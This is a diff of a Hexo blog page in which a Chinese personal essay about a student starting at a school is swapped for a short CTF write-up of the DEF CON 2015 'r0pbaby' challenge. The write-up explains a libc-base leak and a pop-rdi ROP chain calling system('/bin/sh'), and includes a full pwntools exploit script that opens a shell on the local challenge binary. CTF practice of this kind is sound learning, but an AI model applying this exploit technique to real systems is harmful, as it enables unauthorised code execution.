@@ -4,12 +4,12 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>无关风月 | Hexo</title>
+    <title>defcon2015-r0pbaby | Hexo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="Lometsj">
     
-    <meta name="description" content="九月的风吹起来了，吹过树梢，吹过街道，最终吹到了M市著名的M中。 M中大门敞开，像巨大的怪兽张开血腥大嘴，等待着鱼虾的涌入。进了M中大门，左手可看见雄伟的游泳馆，三层高并可容纳上千人进餐的食堂。右手有“画”着近三千年名人文士的长墙，墙后是400米的标准跑道，保养尚好的足球场，篮球场，排球场。通慧楼，">
+    <meta name="description" content="r0pbaby这个以前刚入门的时候做的老题了,作为入门rop的题目,十分直白.运行程序,我们可以得到libc地址,函数地址和一个栈溢出漏洞.通过选项2得到system地址,由于题目提供了libc,这样我们可以用system实际地址减去它在libc中的偏移,算出libc的基地址.求得linc的基地址可">
     
     
     
@@ -67,15 +67,15 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/posts/675c9854/" title="无关风月" itemprop="url">无关风月</a>
+      <a href="/posts/6a17cd88/" title="defcon2015-r0pbaby" itemprop="url">defcon2015-r0pbaby</a>
   </h1>
   <p class="article-author">By
     
       <a href="http://lometsj.com" title="Lometsj">Lometsj</a>
     </p>
   <p class="article-time">
-    <time datetime="2016-05-26T02:54:39.000Z" itemprop="datePublished">2016-05-26</time>
-    Updated:<time datetime="2018-01-19T13:23:37.000Z" itemprop="dateModified">2018-01-19</time>
+    <time datetime="2018-07-16T06:42:22.000Z" itemprop="datePublished">2018-07-16</time>
+    Updated:<time datetime="2018-07-16T06:49:40.537Z" itemprop="dateModified">2018-07-16</time>
     
   </p>
 </header>
@@ -84,11 +84,11 @@
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
-		
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#r0pbaby"><span class="toc-number">1.</span> <span class="toc-text">r0pbaby</span></a></li></ol>
 		</div>
 		
-		<p>九月的风吹起来了，吹过树梢，吹过街道，最终吹到了M市著名的M中。 M中大门敞开，像巨大的怪兽张开血腥大嘴，等待着鱼虾的涌入。<br>进了M中大门，左手可看见雄伟的游泳馆，三层高并可容纳上千人进餐的食堂。右手有“画”着近三千年名人文士的长墙，墙后是400米的标准跑道，保养尚好的足球场，篮球场，排球场。通慧楼，铭志楼，逸夫楼这几幢教学楼并列着围绕着操场。这大概是M中的一点点气势。<br>吴义是一只普通的鱼虾，进入M中，看到这么大的气派，他并未啧啧称奇，反而在心里暗骂自己为什么报了一个这么大的学校，出门上网定要费许多功夫。因为学校太大，走动想来非常浪费时间。想着许多上网时间被走路浪费，真是一件让人痛心的事情。<br>进入寝室，吴义惊讶地发现有独立卫浴，有实木衣柜，和摇起来不会吱吱作响的铁床。他十分不解，忽而又想起上楼时瞥到墙上的紫荆花，思路便豁然开朗起来。紫荆花开在M中，吴义十分开心，以至于忘记了紫荆花开的缘由。人大抵是乐以忘忧的，比如好了伤疤忘了疼，算是一种洒脱的态度。只要不会视伤疤如不见，便不会让人寒心。<br>吴义在暑假，是去看过本土生长的紫荆花的，还曾去那地的巨大游乐场玩过。游乐场是不足为道的，大抵是些过山车，摩天轮，乘船，游行，烟火。跟吴义同行的赵隘，这人有轻微的神经衰弱，晚上有人打鼾便睡不着觉。又玩游乐场的当天晚上，吴赵二人回到像紫荆花一样“精致”的小酒店时，发现同一房间的两个人——即是旅行社安排同住的——已经入睡。赵皱了皱眉头，听到响亮的鼾声，抱起一床铺盖，说：“今晚我睡浴室。”真真在浴室睡了一宿。<br>吴义铺好了床铺，盘算着是先去教室在逛一圈，还是在寝室里等室友见面。方才在教室报道，看到了自己高中的班主任谢首钦，本以为自己遇到了一个40多岁的老货。四下打听，却发现谢班主任才30出头的年龄，竟还没有自己的父亲大。心里暗暗琢磨，教室也许真是三大累人职业的第二名，竟能把人如此摧残的。至于第一嘛，不消说，便是程序员了。正想着，进来了一个人，上身穿着黑色运动服，下身是黑色的棉制运动裤，细细瞧去看不见脖子，大约算个胖子。鲁迅说过胖子应该穿黑的，不显胖，然而吴义此刻觉得鲁迅是个蠢材，胖子穿了黑衣依旧是个胖子，别的不敢说，眼前便有一个铁证。那胖子笑了一下，说：“你好，我叫谭彦。”说罢又继续眯着眼睛笑了起来，然后指着吴义的头上说：“你这个上铺没有人住吧，我睡你上铺罢。”吴义连声答道：“好好好。”心里想着不要压垮了床板砸到自己便是。<br>—————–我是华丽的分割线———————-<br>前些天闲的蛋疼手抄了一遍华鸟风月的歌词，觉得自己在养老院呆久了，心态也变老了是吧。<br>有些人发8周年纪念，我很惊讶我竟然忘了。<br>想了一想又觉得没什么惊讶地，1-7周年我不是也都忘了吗。<br>然而我在高中之后还是一个人回家了一趟，翻过栏杆往大酒店里面往上走被人喊着拦了下来。<br>我能重新审视一下纪念吗，我还是重新审视一下自己吧。<br>买来的豆腐花的豆粉受了潮，泡都泡不了只能扔掉，包装烟卷的铝箔的也挡不住。<br>人的心发了酵，说多少话都拦不住吧。<br>那我还废话什么呢。<br>我并不是见不得别人好的人，看到别人得到奖学金多就不安逸。<br>但是我的希求又在哪里，我的希求是为赋新词强说愁？<br>说到底，我只是想在5.20这个日子之前说<br>赞美太阳<br>继续受苦</p>
-  
+		<h1 id="r0pbaby"><a href="#r0pbaby" class="headerlink" title="r0pbaby"></a>r0pbaby</h1><p>这个以前刚入门的时候做的老题了,作为入门rop的题目,十分直白.运行程序,我们可以得到libc地址,函数地址和一个栈溢出漏洞.<br>通过选项2得到system地址,由于题目提供了libc,这样我们可以用system实际地址减去它在libc中的偏移,算出libc的基地址.<br>求得linc的基地址可以让我们算出’/bin/sh’的实际地址,再在程序中需找一个起rdi的gadget把’/bin/sh’的地址送到参数,调用system函数即可</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#0x0000000000021102 : pop rdi ; ret</span></div><div class="line"></div><div class="line">io = process(<span class="string">'./r0pbaby_542ee6516410709a1421141501f03760'</span>)</div><div class="line">lib = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">gadget = <span class="number">0x21102</span></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">':'</span>)</div><div class="line">io.sendline(<span class="string">'2'</span>)</div><div class="line">io.recvuntil(<span class="string">'symbol:'</span>)</div><div class="line">io.sendline(<span class="string">'system'</span>)</div><div class="line">ret = io.recvuntil(<span class="string">'4) Exit\n:'</span>)</div><div class="line">left = ret.find(<span class="string">'0x'</span>)</div><div class="line">addr = int(ret[left:left + <span class="number">18</span>],<span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> hex(addr)</div><div class="line"></div><div class="line">libc_base = addr - lib.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">io.sendline(<span class="string">'3'</span>)</div><div class="line">io.recv()</div><div class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(libc_base + gadget) + p64(libc_base + lib.search(<span class="string">'/bin/sh'</span>).next()) + p64(addr)</div><div class="line">io.sendline(<span class="string">'32'</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>  
 	</div>
 		<footer class="article-footer clearfix">
 
@@ -97,7 +97,7 @@
 
 <div class="article-share" id="share">
 
-  <div data-url="http://lometsj.com/posts/675c9854/" data-title="无关风月 | Hexo" data-tsina="" class="share clearfix">
+  <div data-url="http://lometsj.com/posts/6a17cd88/" data-title="defcon2015-r0pbaby | Hexo" data-tsina="" class="share clearfix">
   </div>
 
 </div>
@@ -106,14 +106,14 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/posts/d8d4b91c/" title="ALICTF 2016 vss">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  ALICTF 2016 vss</span>
+
+<div class="next">
+<a href="/posts/f500597a/"  title="ciscn2018半决赛-mirage_game">
+ <strong>NEXT:</strong><br/> 
+ <span>ciscn2018半决赛-mirage_game
+</span>
 </a>
 </div>
-
 
 </nav>
 
@@ -123,7 +123,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
-  
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#r0pbaby"><span class="toc-number">1.</span> <span class="toc-text">r0pbaby</span></a></li></ol>
   </div>
 
 <div id="asidepart">
